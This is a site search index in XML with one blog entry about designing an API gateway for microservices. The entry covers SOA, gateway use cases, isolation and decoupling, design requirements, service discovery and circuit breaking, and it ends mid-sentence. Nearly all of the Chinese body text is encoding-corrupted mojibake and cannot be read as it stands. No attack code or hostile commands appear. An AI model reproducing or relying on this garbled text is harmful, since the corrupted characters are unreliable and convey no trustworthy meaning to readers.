<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[å¾®æœåŠ¡ä¹‹API Gateway]]></title>
    <url>%2F2017%2F08%2F01%2Fapi-gateway%2F</url>
    <content type="text"><![CDATA[å¾®æœåŠ¡æž¶æž„ä¸­é‚£äº›å•ä½“å¾®æœåŠ¡å…³æ³¨ä¸Žè‡ªèº«é¢†åŸŸ, è€ŒAPIGatewayå…³æ³¨æœåŠ¡å…¨è²Œ, æ‰€ä»¥ä»–æ˜¯ä¸€ä¸ªç»Ÿç­¹è€…, å¾ˆå¤šå…¨å±€éƒ½éœ€è¦çš„åŠŸèƒ½éœ€è¦åœ¨APIGatewayå¤„è¿›è¡Œå®žçŽ°, è¿™ç¯‡æ–‡ç« æ˜¯è®¾è®¡ä¸€ä¸ªAPI Gatewayçš„æ¦‚è¿°, è®²è¿°APIç½‘å…³çš„éœ€æ±‚ã€ä»·å€¼ã€ä»¥åŠè®¾è®¡è¦æ±‚ã€‚ SOAè®¾è®¡æ–¹æ³•SOAæ˜¯ä¸€ç§æž¶æž„çš„è®¾è®¡æ–¹æ³•, å…¨ç§°æ˜¯Service-Oriented Architecture(é¢å‘æœåŠ¡çš„æž¶æž„)ï¼Œå®ƒå°†åº”ç”¨ç¨‹åºçš„ä¸åŒåŠŸèƒ½å•å…ƒæ‹†è§£æˆç‹¬ç«‹çš„æœåŠ¡, å¤šä¸ªæœåŠ¡ç›´æŽ¥é€šè¿‡è‰¯å¥½çš„æŽ¥å£å’Œå¥‘çº¦è”ç³»èµ·æ¥,é‡‡ç”¨ç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚ SOAå¯ä»¥è®©è½¯ä»¶æž¶æž„è¾¾åˆ°æ¾è€¦åˆ, å¯ä»¥ç”¨æ¥åº”å¯¹è‡ƒè‚¿çš„å•ä½“åº”ç”¨, æ¯”å¦‚å¤šä¸ªç»ˆç«¯ç”¨æˆ·åº”ç”¨ç¨‹åºå¯ä»¥å…±äº«åŒä¸€ä¸ªæœåŠ¡, å®ƒçš„ç›®æ ‡æ˜¯åœ¨ä¸å½±å“å…¶ä»–ä»»ä½•äººçš„æƒ…å†µä¸‹é€æ˜Žåœ°æ›¿æ¢ä¸€ä¸ªæœåŠ¡,åªè¦æ›¿æ¢ä¹‹åŽçš„æœåŠ¡çš„å¤–éƒ¨æŽ¥å£æ²¡æœ‰å¤ªå¤§çš„å˜åŒ–å³å¯ã€‚è¿™ç§æ€§è´¨èƒ½å¤Ÿå¤§å¤§ç®€åŒ–è½¯ä»¶ç»´æŠ¤ç”šè‡³æ˜¯è½¯ä»¶é‡å†™çš„è¿‡ç¨‹ã€‚ ä»…ä»…è¾¾åˆ°æ¾è€¦åˆæ˜¯ä¸å¤Ÿçš„, æ¾è€¦åˆä¼šå¸¦æ¥å¤æ‚æ€§é—®é¢˜, å› æ­¤åŒæ—¶ä¹Ÿéœ€è¦é«˜å†…èš, APIç½‘å…³å°±æ˜¯ç”¨æ¥åšè¿™ä¸ªçš„, å› æ­¤å¯¹å¤–é‡‡ç”¨é«˜å†…èšçš„è¡¨çŽ°å½¢å¼æ¥é™ä½Žå¤æ‚æ€§, å¯¹å†…é‡‡ç”¨æ¾è€¦åˆçš„å®žçŽ°æ–¹å¼æ¥åº”å¯¹å¿«é€Ÿå˜åŒ–çš„éœ€æ±‚ã€‚ èƒŒæ™¯ä»‹ç»APIç½‘å…³çš„æµè¡Œï¼ŒæºäºŽè¿‘å‡ å¹´æ¥ï¼Œç§»åŠ¨åº”ç”¨ä¸Žä¼ä¸šé—´äº’è”éœ€æ±‚çš„å…´èµ·ã€‚ç§»åŠ¨åº”ç”¨ã€ä¼ä¸šäº’è”ï¼Œä½¿å¾—åŽå°æœåŠ¡æ”¯æŒçš„å¯¹è±¡ï¼Œä»Žä»¥å‰å•ä¸€çš„Webåº”ç”¨ï¼Œæ‰©å±•åˆ°å¤šç§ä½¿ç”¨åœºæ™¯ï¼Œä¸”æ¯ç§ä½¿ç”¨åœºæ™¯å¯¹åŽå°æœåŠ¡çš„è¦æ±‚éƒ½ä¸å°½ç›¸åŒã€‚è¿™ä¸ä»…å¢žåŠ äº†åŽå°æœåŠ¡çš„å“åº”é‡ï¼Œè¿˜å¢žåŠ äº†åŽå°æœåŠ¡çš„å¤æ‚æ€§ã€‚éšç€å¾®æœåŠ¡æž¶æž„æ¦‚å¿µçš„æå‡ºï¼ŒAPIç½‘å…³æˆä¸ºäº†å¾®æœåŠ¡æž¶æž„çš„ä¸€ä¸ªæ ‡é…ç»„ä»¶ã€‚ å®ƒç”¨äºŽå¤„ç†å¾ˆå¤šé€šç”¨çš„é—®é¢˜, æ¯”å¦‚è®¿é—®è®¤è¯ã€æŠ¥æ–‡è½¬æ¢ã€è®¿é—®ç»Ÿè®¡ã€æœåŠ¡å‘çŽ°ã€é™æµç­‰ç­‰ã€‚ ä½¿ç”¨åœºæ™¯çŽ‹å»¶ç‚¯åœ¨è°ˆAPIç½‘å…³çš„èƒŒæ™¯ã€æž¶æž„ä»¥åŠè½åœ°æ–¹æ¡ˆæœ‰å¦‚ä¸‹5ç§åœºæ™¯ä»‹ç»: é¢å‘Web Appçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œåœ¨ç‰©ç†å½¢æ€ä¸Šç±»ä¼¼å‰åŽç«¯åˆ†ç¦»ï¼Œæ­¤æ—¶çš„Web Appå·²ç»ä¸æ˜¯å…¨åŠŸèƒ½çš„Web Appï¼Œè€Œæ˜¯æ ¹æ®åœºæ™¯å®šåˆ¶ã€åœºæ™¯åŒ–çš„Appã€‚ é¢å‘MobileAppçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œç§»åŠ¨Appæ˜¯åŽç«¯Serviceçš„ä½¿ç”¨è€…ï¼Œæ­¤æ—¶çš„APIGWè¿˜éœ€è¦æ‰¿æ‹…ä¸€éƒ¨åˆ†MDMï¼ˆæ­¤å¤„æ˜¯æŒ‡ç§»åŠ¨è®¾å¤‡ç®¡ç†ï¼Œä¸æ˜¯ä¸»æ•°æ®ç®¡ç†ï¼‰çš„èŒèƒ½ã€‚ é¢å‘PartnerOpenAPIçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œä¸»è¦ä¸ºäº†æ»¡è¶³ä¸šåŠ¡å½¢æ€å¯¹å¤–å¼€æ”¾ï¼Œä¸Žä¼ä¸šå¤–éƒ¨åˆä½œä¼™ä¼´å»ºç«‹ç”Ÿæ€åœˆï¼Œæ­¤æ—¶çš„API GWéœ€è¦å¢žåŠ é…é¢ã€æµæŽ§ã€ä»¤ç‰Œç­‰ä¸€ç³»åˆ—å®‰å…¨ç®¡æŽ§åŠŸèƒ½ã€‚ é¢å‘PartnerExternalAPIçš„ç½‘å…³è¿™ç±»åœºæ™¯ï¼Œä¸»è¦æ˜¯ä¸ºäº†æ»¡è¶³ä¼ä¸šè‡ªèº«ä¸šåŠ¡çš„éœ€è¦ï¼Œå®žçŽ°å¯¹ä¼ä¸šè‡ªæœ‰ä¸šåŠ¡çš„æ˜ å°„ã€‚ä¸€ä¸ªå…¸åž‹çš„ä¾‹å­å°±æ˜¯ä½¿ç”¨ã€Œåˆä½œæ–¹è´¦å·ç™»å½•ã€ã€ã€Œä½¿ç”¨ç¬¬ä¸‰æ–¹æ”¯ä»˜å¹³å°æ”¯ä»˜ã€ç­‰ç­‰ã€‚æ­¤æ—¶çš„APIGWå°±éœ€è¦åœ¨è¾¹ç•Œä¸Šï¼Œä¸ºä¼ä¸šå†…éƒ¨Service ç»Ÿä¸€è°ƒç”¨å¤–éƒ¨çš„APIåšç»Ÿä¸€çš„è®¤è¯ã€æŽˆæƒã€ä»¥åŠè®¿é—®æŽ§åˆ¶ã€‚ é¢å‘IoTSmartDeviceçš„ç½‘å…³è¿™ç±»åœºæ™¯ä¸»è¦åœ¨ä¼ ç»Ÿä¼ä¸šï¼Œå°¤å…¶æ˜¯å·¥ä¸šä¼ä¸šï¼Œä¼ æ„Ÿå™¨ã€ç‰©ç†è®¾å¤‡ä»Žå·¥ä¸šæŽ§åˆ¶åè®®å‘IPè½¬æ¢ï¼Œå¯¼è‡´ç‰©ç†é“¾è·¯ä¸Šä¼šå­˜åœ¨ä¸€éƒ¨åˆ†å…¬ç½‘é“¾è·¯ã€‚æ­¤æ—¶çš„API GWæ‰€éœ€è¦æ»¡è¶³çš„ã€Œå†…å¤–å…¼ä¿®ã€çš„åŒå‘æ•°æ®æµï¼Œè®¾å¤‡ä¸€èˆ¬é€šè¿‡ä¸€ä¸ªã€Œå®¢æˆ·ä¾§ã€çš„é›†ä¸­ç½‘å…³åœ¨å’Œä¼ä¸šçš„æŽ¥å…¥ç½‘å…³è¿›è¡Œé€šä¿¡ã€‚ åœ¨æˆ‘ä»¬è®²çš„å¾®æœåŠ¡æž¶æž„ä¸‹çš„APIç½‘å…³ï¼Œä¸€èˆ¬æŒ‡çš„æ˜¯å‰ä¸¤ç§ä½¿ç”¨åœºæ™¯ã€‚å³ï¼Œä¸»è¦æ˜¯æŠŠä¼ä¸šå†…éƒ¨çš„APIèƒ½åŠ›ï¼Œæš´éœ²ç»™å…¶ä»–åº”ç”¨æˆ–åˆä½œä¼™ä¼´ä½¿ç”¨ã€‚ ç½‘å…³çš„ä»·å€¼ç½‘å…³å±‚ä½œä¸ºå®¢æˆ·ç«¯ä¸ŽæœåŠ¡ç«¯çš„ä¸€å±‚æŒ¡æ¿ï¼Œä¸»è¦èµ·åˆ°äº†ä¸‰å¤§ç±»ä½œç”¨: å†…å¤–éš”ç¦»: å¼ºè°ƒå®‰å…¨æ€§, ä¼ä¸šç³»ç»Ÿçš„è¾¹ç•Œ,éš”ç¦»å¤–ç½‘çŽ¯å¢ƒå’Œå†…ç½‘çŽ¯å¢ƒã€‚ æœåŠ¡è§£è€¦: æœ‰äº†ç½‘å…³å’ŒæœåŠ¡å±‚çš„è§£è€¦, ä½¿å¾—å¾®æœåŠ¡ç³»ç»Ÿçš„å„æ–¹èƒ½å¤Ÿç‹¬ç«‹ã€è‡ªç”±ã€é«˜æ•ˆã€çµæ´»åœ°è°ƒæ•´ï¼Œè€Œä¸ç”¨æ‹…å¿ƒç»™å…¶ä»–æ–¹é¢å¸¦æ¥å½±å“, ä¾¿äºŽå„ä¸ªå›¢é˜Ÿå·¥ä½œçš„ç‹¬ç«‹æ€§ã€‚ è¾…åŠ©åŠŸèƒ½: æä¾›äº†ä¸€ä¸ªåœ°ç‚¹ï¼Œæ–¹ä¾¿é€šè¿‡æ‰©å±•æœºåˆ¶å¯¹è¯·æ±‚è¿›è¡Œä¸€ç³»åˆ—åŠ å·¥å’Œå¤„ç†ã€‚ å†…å¤–éš”ç¦»ä¼ä¸šä¸ºäº†ä¿æŠ¤å†…éƒ¨ç³»ç»Ÿçš„å®‰å…¨æ€§ï¼Œå†…ç½‘ä¸Žå¤–ç½‘éƒ½æ˜¯éš”ç¦»çš„ï¼Œä¼ä¸šçš„æœåŠ¡åº”ç”¨éƒ½æ˜¯è¿è¡Œåœ¨å†…ç½‘çŽ¯å¢ƒä¸­ï¼Œä¸ºäº†å®‰å…¨çš„è€ƒé‡ï¼Œä¸€èˆ¬éƒ½ä¸å…è®¸å¤–éƒ¨ç›´æŽ¥è®¿é—®ã€‚APIç½‘å…³éƒ¨ç½²åœ¨é˜²ç«å¢™å¤–é¢ï¼Œèµ·åˆ°ä¸€å±‚æŒ¡æ¿ä½œç”¨ï¼Œå†…éƒ¨ç³»ç»ŸåªæŽ¥å—APIç½‘å…³è½¬å‘è¿‡æ¥çš„è¯·æ±‚ã€‚ç½‘å…³é€šè¿‡ç™½åå•æˆ–æ ¡éªŒè§„åˆ™ï¼Œå¯¹è®¿é—®è¿›è¡Œäº†åˆæ­¥çš„è¿‡æ»¤ã€‚ç›¸æ¯”é˜²ç«å¢™ï¼Œè¿™ç§è½¯ä»¶å®žçŽ°çš„è¿‡æ»¤è§„åˆ™ï¼Œæ›´åŠ åŠ¨æ€çµæ´»ã€‚åœ¨å®‰å…¨çš„è§’åº¦è€Œè¨€, æ­¤æ—¶ç½‘å…³å……å½“ç€åº”ç”¨é˜²ç«å¢™çš„ä½œç”¨(WAF)ã€‚ æœåŠ¡è§£è€¦åœ¨å¾®æœåŠ¡æž¶æž„ä¸‹ï¼Œæ•´ä¸ªçŽ¯å¢ƒåŒ…æ‹¬æœåŠ¡çš„æä¾›è€…ã€æœåŠ¡çš„æ¶ˆè´¹è€…ã€æœåŠ¡è¿ç»´äººå‘˜ã€å®‰å…¨ç®¡ç†äººå‘˜ç­‰ï¼Œæ¯ä¸ªè§’è‰²çš„èŒè´£å’Œè¿°æ±‚éƒ½ä¸åŒã€‚ä¾‹å¦‚ï¼šæœåŠ¡æ¶ˆè´¹è€…å·²ç»éœ€è¦æå‡ºä¸€äº›æ–°çš„æœåŠ¡éœ€æ±‚ï¼Œä»¥å¿«é€Ÿåº”å¯¹ä¸šåŠ¡å˜åŒ–ï¼›æœåŠ¡æä¾›è€…ï¼Œä½œä¸ºä¸šåŠ¡æœåŠ¡çš„æ²‰æ·€æ–¹ï¼Œå¸Œæœ›ä¿æŒæœåŠ¡çš„é€šç”¨æ€§ä¸Žç¨³å®šæ€§ï¼Œå¾ˆéš¾åº”å¯¹å¿«é€Ÿçš„å˜åŒ–ã€‚æœ‰äº†APIç½‘å…³è¿™ä¸€å±‚ï¼Œå¯ä»¥å¾ˆå¥½çš„è§£è€¦å„æ–¹çš„ç›¸äº’ä¾èµ–å…³ç³»ï¼Œè®©å„æ–¹æ›´åŠ ä¸“æ³¨è‡ªå·±çš„ç›®æ ‡ã€‚ è§£è€¦åŠŸèƒ½ä¸ŽéžåŠŸèƒ½ä¼ä¸šåœ¨æŠŠæœåŠ¡æä¾›ç»™å¤–éƒ¨è®¿é—®æ—¶ï¼Œé™¤äº†å®žçŽ°ä¸šåŠ¡é€»è¾‘åŠŸèƒ½å¤–ï¼Œè¿˜é¢ä¸´è®¸å¤šéžåŠŸèƒ½æ€§çš„è¦æ±‚ã€‚ä¾‹å¦‚ï¼šéœ€è¦é˜²èŒƒé»‘å®¢æ”»å‡»ï¼Œéœ€è¦åº”å¯¹çªå‘çš„è®¿é—®é‡ã€éœ€è¦ç¡®è®¤ç”¨æˆ·çš„æƒé™ï¼Œéœ€è¦å¯¹è®¿é—®è¿›è¡Œç›‘æŽ§ç­‰ã€‚è¿™äº›éžåŠŸèƒ½é€»è¾‘ï¼Œä¸èƒ½ä¸Žä¸šåŠ¡é€»è¾‘çš„å¼€å‘æ··åœ¨ä¸€èµ·ï¼Œéœ€è¦æœ‰ä¸“ä¸šçš„äººå‘˜ç”šè‡³ä¸“ä¸šçš„å›¢é˜Ÿæ¥å¤„ç†ã€‚ è§£è€¦å®¢æˆ·ç«¯ä¸ŽæœåŠ¡æä¾›è€…å®¢æˆ·ç«¯ä¸ŽæœåŠ¡æä¾›è€…åˆ†å±žäºŽä¸åŒçš„å›¢é˜Ÿï¼Œå·¥ä½œæ€§è´¨è¦æ±‚ä¹Ÿä¸ç›¸åŒã€‚å¯¹äºŽæœåŠ¡æä¾›è€…æ¥è¯´ï¼Œä»–ä¸»è¦çš„èŒè´£æ˜¯å¯¹ä¸šåŠ¡è¿›è¡ŒæŠ½è±¡ï¼Œæä¾›å¯å¤ç”¨çš„ä¸šåŠ¡åŠŸèƒ½ï¼Œä»–ä»¬éœ€è¦å¯¹ä¸šåŠ¡æ¨¡åž‹è¿›è¡Œæ·±å…¥çš„æ€è€ƒå’Œæ²‰æ·€ï¼Œä¸èƒ½è½»æ˜“ä¸ºäº†å“åº”å¤–éƒ¨çš„éœ€æ±‚è€Œç ´åä¸šåŠ¡æ¨¡åž‹çš„ç¨³å®šæ€§ã€‚è€Œä¸šåŠ¡çš„å¿«é€Ÿå˜åŒ–ï¼Œåˆè¦æ±‚ä¼ä¸šå¿«é€Ÿæä¾›æŽ¥å£æ¥æ»¡è¶³å®¢æˆ·ç«¯éœ€æ±‚ã€‚è¿™å°±éœ€è¦ä¸€ä¸ªä¸­é—´å±‚ï¼Œæ¥å¯¹æœåŠ¡å±‚çš„æŽ¥å£è¿›è¡Œå°è£…ï¼Œä»¥åŠæ—¶å“åº”å®¢æˆ·ç«¯çš„éœ€æ±‚ã€‚é€šè¿‡è§£è€¦ï¼ŒæœåŠ¡å±‚å¯ä»¥ä½¿ç”¨ç»Ÿä¸€çš„æŽ¥å£ã€åè®®å’ŒæŠ¥æ–‡æ ¼å¼æ¥æš´éœ²æœåŠ¡ï¼Œè€Œä¸å¿…è€ƒè™‘å®¢æˆ·ç«¯çš„å¤šç§å½¢æ€ã€‚é‚£ä¹ˆ ç½‘å…³å±‚æ˜¯å¦éœ€è¦å®žçŽ°æœåŠ¡çš„ç¼–æŽ’ï¼Ÿåœ¨ä»‹ç»APIç½‘å…³çš„ä¸€äº›æ–‡ç« ä¸­ï¼Œæåˆ°äº†ç½‘å…³å±‚çš„æœåŠ¡ç¼–æŽ’èƒ½åŠ›ã€‚ä»Žè§£è€¦çš„è§’åº¦å‡ºå‘ï¼ŒæœåŠ¡çš„ç¼–æŽ’ä¸é€‚åˆåœ¨ç½‘å…³å±‚è¿›è¡Œã€‚å¯¹æœåŠ¡çš„ç¼–æŽ’ï¼Œå…¶å®žæ˜¯æä¾›äº†ä¸€ç§ä¸šåŠ¡èƒ½åŠ›ï¼Œå¦‚æžœæŠŠæœåŠ¡çš„ç¼–æŽ’æ”¾åœ¨äº†ç½‘å…³å±‚ï¼Œå®žé™…ä¸Šæ˜¯æŠŠä¸€éƒ¨åˆ†ä¸šåŠ¡èƒ½åŠ›æ”¾åœ¨äº†ç½‘å…³å±‚ï¼Œè¿™æ ·ä¸€æ¥ï¼ŒæœåŠ¡å±‚ã€ç½‘å…³å±‚éƒ½æœ‰ä¸€äº›ä¸šåŠ¡èƒ½åŠ›ï¼Œé€ æˆå›¢é˜ŸèŒè´£çš„ä¸æ¸…ï¼Œä¹Ÿä¸åˆ©äºŽä¸šåŠ¡èƒ½åŠ›çš„æ²‰æ·€ã€‚ è¾…åŠ©åŠŸèƒ½ç½‘å…³å±‚é™¤äº†è¯·æ±‚çš„è·¯ç”±ã€è½¬å‘å¤–ï¼Œè¿˜éœ€è¦è´Ÿè´£å®‰å…¨ã€é‰´æƒã€é™æµã€ç›‘æŽ§ç­‰ã€‚è¿™äº›åŠŸèƒ½çš„å®žçŽ°æ–¹å¼ï¼Œå¾€å¾€éšç€ä¸šåŠ¡çš„å˜åŒ–ä¸æ–­è°ƒæ•´ã€‚ä¾‹å¦‚æƒé™æŽ§åˆ¶æ–¹é¢ï¼Œæ—©æœŸå¯èƒ½åªéœ€è¦ç®€å•çš„ç”¨æˆ·+å¯†ç æ–¹å¼ï¼ŒåŽç»­ç”¨æˆ·é‡å¤§äº†åŽï¼Œå¯èƒ½ä¼šä½¿ç”¨é«˜æ€§èƒ½çš„ç¬¬ä¸‰æ–¹è§£å†³æ–¹æ¡ˆã€‚åˆä¾‹å¦‚ï¼Œé’ˆå¯¹ä¸åŒçš„ç›‘æŽ§æ–¹æ¡ˆï¼Œéœ€è¦è®°å½•ä¸åŒçš„æ—¥å¿—æ–‡ä»¶ã€‚æ‰€ä»¥ï¼Œè¿™äº›èƒ½åŠ›ä¸èƒ½ä¸€å¼€å§‹å°±å›ºåŒ–åœ¨ç½‘å…³å¹³å°ä¸Šï¼Œè€Œåº”è¯¥æ˜¯ä¸€ç§å¯é…ç½®çš„æ–¹å¼ï¼Œä¾¿äºŽä¿®æ”¹å’Œæ›¿æ¢ã€‚è¿™å°±è¦æ±‚ç½‘å…³å±‚æä¾›ä¸€å¥—æœºåˆ¶ï¼Œå¯ä»¥å¾ˆå¥½åœ°æ”¯æŒè¿™ç§åŠ¨æ€æ‰©å±•ã€‚ æ€»ç»“æœ‰äº†APIç½‘å…³åŽ, ä¼šæœ‰ä»¥ä¸‹ä¼˜ç‚¹ ç½‘å…³å±‚å¯¹å¤–éƒ¨å’Œå†…éƒ¨è¿›è¡Œäº†éš”ç¦»ï¼Œä¿éšœäº†åŽå°æœåŠ¡çš„å®‰å…¨æ€§ã€‚ å¯¹å¤–è®¿é—®æŽ§åˆ¶ç”±ç½‘ç»œå±‚é¢è½¬æ¢æˆäº†è¿ç»´å±‚é¢ï¼Œå‡å°‘å˜æ›´çš„æµç¨‹å’Œé”™è¯¯æˆæœ¬ å‡å°‘å®¢æˆ·ç«¯ä¸ŽæœåŠ¡çš„è€¦åˆï¼ŒæœåŠ¡å¯ä»¥ç‹¬ç«‹å‘å±•ã€‚é€šè¿‡ç½‘å…³å±‚æ¥åšæ˜ å°„ã€‚ é€šè¿‡ç½‘å…³å±‚èšåˆï¼Œå‡å°‘å¤–éƒ¨è®¿é—®çš„é¢‘æ¬¡ï¼Œæå‡è®¿é—®æ•ˆçŽ‡ã€‚ èŠ‚çº¦åŽç«¯æœåŠ¡å¼€å‘æˆæœ¬ï¼Œå‡å°‘ä¸Šçº¿é£Žé™©ã€‚ ä¸ºæœåŠ¡ç†”æ–­ï¼Œç°åº¦å‘å¸ƒï¼Œçº¿ä¸Šæµ‹è¯•æä¾›ç®€å•æ–¹æ¡ˆã€‚ ä¾¿äºŽæ‰©å±•ã€‚ è®¾è®¡è¦æ±‚é‚£ä¹ˆAPIç½‘å…³åœ¨è®¾è®¡æ—¶éœ€è¦è€ƒè™‘åˆ°é‚£äº›ç‚¹å–ƒï¼Ÿ é«˜æ€§èƒ½ç½‘å…³ä½œä¸ºåº”ç”¨è®¿é—®çš„å”¯ä¸€å…¥å£, æ‰€æœ‰çš„è¯·æ±‚éƒ½ä¼šç»è¿‡APIç½‘å…³è¿›è¡Œè½¬å‘, å¯æƒ³è€ŒçŸ¥, å¯¹APIç½‘å…³çš„è®¿é—®åŽ‹åŠ›æ˜¯å·¨å¤§çš„ã€‚å› æ­¤APIç½‘å…³å¯¹æ€§èƒ½è¦æ±‚æ¯”è¾ƒé«˜, æ€§èƒ½ä¸Šè‡³å°‘ä¸èƒ½æ¯”nginxå¼±å¤ªå¤š, å› æ­¤ä¸šå†…ä½¿ç”¨nginx + luaçš„æ¯”è¾ƒå¤šã€‚ é«˜å¯ç”¨APIç½‘å…³ä½œä¸ºé€»è¾‘ä¸Šçš„å•ç‚¹ï¼Œä¸€æ—¦å‘ç”Ÿé—®é¢˜ï¼Œå°†é€ æˆæ‰€æœ‰æœåŠ¡çš„ä¸å¯ç”¨ï¼Œå¯¹ä¼ä¸šæ¥è¯´å¯èƒ½é€ æˆçš„è‡´å‘½çš„å½±å“ã€‚è®¡ç®—çŸ­æ—¶é—´çš„ä¸å¯ç”¨ï¼Œä¹Ÿä¼šç»™ä¼ä¸šå¸¦æ¥ç›´æŽ¥çš„ç»æµŽæŸå¤±ã€‚æ‰€ä»¥ï¼Œå¦‚ä½•ä¿è¯APIç½‘å…³çš„7*24å°æ—¶çš„ç¨³å®šè¿è¡Œ, å› æ­¤ ç½‘å…³åœ¨å®žçŽ°æ—¶ä¸€å®šè¦è€ƒè™‘æ¨ªå‘æ‰©å±•å’ŒAPIçƒ­æ›´æ–°çš„èƒ½åŠ›, é¿å…APIç½‘å…³å®•æœºã€‚ é«˜æ‰©å±•å‰é¢è¯´åˆ°, ä¸€äº›éžä¸šåŠ¡åŠŸèƒ½çš„éœ€æ±‚éœ€è¦ç½‘å…³æä¾›, æ¯”å¦‚: ä¾‹å¦‚æ—¥å¿—ã€å®‰å…¨ã€è´Ÿè½½å‡è¡¡ç­–ç•¥ã€é‰´æƒç­‰, è¿™å°±éœ€è¦ç½‘å…³å±‚æä¾›è¿™æ ·ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—å¯ä»¥çµæ´»åœ°è¿›è¡Œè¿™äº›è°ƒæ•´å’Œå˜åŒ–ï¼Œè€Œä¸ç”¨é¢‘ç¹å¯¹ç½‘å…³å±‚è¿›è¡Œæ”¹åŠ¨ï¼Œç¡®ä¿ç½‘å…³å±‚çš„ç¨³å®šæ€§ã€‚æ¯”å¦‚nginxé‡‡ç”¨æ¨¡å—æ¥è¿›è¡Œæ‰©å±•, å¹¶ä¸”æ”¯æŒæ¨¡å—çš„åŠ¨æ€åŠ è½½ã€‚ é«˜è¿ç»´APIåœ¨ä¸Šçº¿ã€å‘å¸ƒè¿‡ç¨‹ä¸­ï¼Œéƒ½éœ€è¦æ¶‰åŠåˆ°ç½‘å…³å±‚çš„é…åˆï¼Œä¾‹å¦‚ï¼Œéœ€è¦ç½‘å…³å±‚çŸ¥é“APIå‘å¸ƒçš„åœ°å€ï¼ŒAPIçš„æŽ¥å£å½¢å¼ã€æŠ¥æ–‡æ ¼å¼ï¼Œä¹Ÿéœ€è¦ç½‘å…³å±‚å¯¹åŽå°APIè¿›è¡Œå°è£…ã€‚åœ¨APIè°ƒæ•´åŽï¼Œéœ€è¦ä½œå‡ºç›¸åº”çš„ä¿®æ”¹ã€‚æ‰€ä»¥ï¼ŒAPIç½‘å…³è®¾è®¡æ—¶ï¼Œéœ€è¦æ˜Žç¡®ç½‘å…³å±‚ä¸ŽæœåŠ¡å±‚çš„èŒè´£åˆ‡åˆ†ä¸Žåä½œæ¨¡å¼ï¼Œä½¿å¾—APIçš„ç®¡ç†ã€å‘å¸ƒæ›´åŠ é«˜æ•ˆã€‚ è½åœ°æ–¹æ¡ˆé’ˆå¯¹ä»¥ä¸Šçš„éœ€è¦, å¦‚ä½•è®¾è®¡ä¸€æ¬¾è¿˜é è°±çš„APIç½‘å…³å–ƒ? è®¾è®¡åŽŸåˆ™ é«˜æ€§èƒ½: é‡‡ç”¨Golangæ¥è¿›è¡Œå¼€å‘, ç¡®ä¿æ€§èƒ½ é«˜å¯ç”¨: 1. ç½‘å…³å±‚é‡‡ç”¨æ— çŠ¶æ€è®¾è®¡, å°†è®¤è¯æ¨¡å—ç‹¬ç«‹å¤„ç† 2. ä¼˜é›…ä¸‹çº¿, é‡‡ç”¨go çš„gracefulåšå¤„ç† é«˜æ‰©å±•: é‡‡ç”¨httpä¸­é—´ä»¶çš„æ–¹å¼, æä¾›çµæ´»çš„æ‰©å±•èƒ½åŠ› åŠŸèƒ½ç‚¹ä¸€ä¸ªå®Œæ•´çš„APIç½‘å…³åº”è¯¥å…·æœ‰å¦‚ä¸‹å‡ æ–¹é¢çš„åŠŸèƒ½: æœåŠ¡å‘çŽ°, è´Ÿè½½å‡è¡¡, æœåŠ¡å¥åº·çŠ¶æ€æ£€æŸ¥API Gatewayéœ€è¦çŸ¥é“æ¯ä¸€ä¸ªå¾®æœåŠ¡çš„IPå’Œç«¯å£ã€‚åœ¨ä¼ ç»Ÿåº”ç”¨ä¸­ï¼Œä½ å¯èƒ½ä¼šç¡¬ç¼–ç è¿™äº›åœ°å€ï¼Œä½†æ˜¯åœ¨çŽ°åœ¨äº‘åŸºç¡€çš„å¾®æœåŠ¡åº”ç”¨ä¸­ï¼Œè¿™å°†æ˜¯ä¸ªç®€å•çš„é—®é¢˜ã€‚åŸºç¡€æœåŠ¡é€šå¸¸ä¼šé‡‡ç”¨é™æ€åœ°å€ï¼Œå¯ä»¥é‡‡ç”¨æ“ä½œç³»ç»ŸçŽ¯å¢ƒå˜é‡æ¥æŒ‡å®šã€‚ä½†æ˜¯ï¼ŒæŽ¢æµ‹åº”ç”¨æœåŠ¡çš„åœ°å€å°±æ²¡é‚£ä¹ˆå®¹æ˜“äº†ã€‚åº”ç”¨æœåŠ¡é€šå¸¸åŠ¨æ€åˆ†é…åœ°å€å’Œç«¯å£ã€‚åŒæ ·çš„ï¼Œç”±äºŽæ‰©å±•æˆ–è€…å‡çº§ï¼ŒæœåŠ¡çš„å®žä¾‹ä¹Ÿä¼šåŠ¨æ€çš„æ”¹å˜ã€‚å› æ­¤ï¼ŒAPI Gatewayéœ€è¦é‡‡ç”¨ç³»ç»Ÿçš„æœåŠ¡å‘çŽ°æœºåˆ¶ï¼Œè¦ä¹ˆé‡‡ç”¨æœåŠ¡ç«¯å‘çŽ°ï¼Œè¦ä¹ˆæ˜¯å®¢æˆ·ç«¯å‘çŽ°ã€‚å¦‚æžœé‡‡ç”¨å®¢æˆ·ç«¯å‘çŽ°æœåŠ¡ï¼ŒAPI Gatewayå¿…é¡»è¦åŽ»æŸ¥è¯¢æœåŠ¡æ³¨å†Œå¤„ï¼Œä¹Ÿå°±æ˜¯å¾®æœåŠ¡å®žä¾‹åœ°å€çš„æ•°æ®åº“ã€‚å‘çŽ°äº†å¤šä¸ªå¾®æœåŠ¡çš„å®žä¾‹è¿‡åŽ, éœ€è¦é‡‡ç”¨è´Ÿè½½å‡è¡¡æœºåˆ¶è¿›è¡Œè°ƒåº¦, å¹¶ä¸”éœ€è¦æ£€æŸ¥æœåŠ¡çŠ¶æ€, å½“æœåŠ¡ç¦»çº¿æ—¶, è¯·æ±‚å°†ä¸ä¼šè°ƒåº¦åˆ°è¯¥èŠ‚ç‚¹ã€‚ ç†”æ–­æ¨¡å¼ä¹Ÿå«circuit breakæ¨¡å¼ï¼Œå®ƒå¯ä»¥å°†å®¢æˆ·ç«¯ä»Žæ— å“åº”æœåŠ¡çš„æ— å°½ç­‰å¾…ä¸­åœæ­¢ã€‚å¦‚æžœä¸€ä¸ªæœåŠ¡çš„é”™è¯¯çŽ‡è¶…è¿‡é¢„è®¾å€¼ï¼Œå°†ä¸­æ–­æœåŠ¡ï¼Œå¹¶ä¸”åœ¨ä¸€æ®µæ—¶é—´å†…æ‰€æœ‰è¯·æ±‚ç«‹åˆ»å¤±æ•ˆã€‚å…·ä½“å¯ä»¥å‚è€ƒ: ç†”æ–­å™¨ é€ŸçŽ‡é™åˆ¶æ— è®ºå¦‚ä½• ä½ 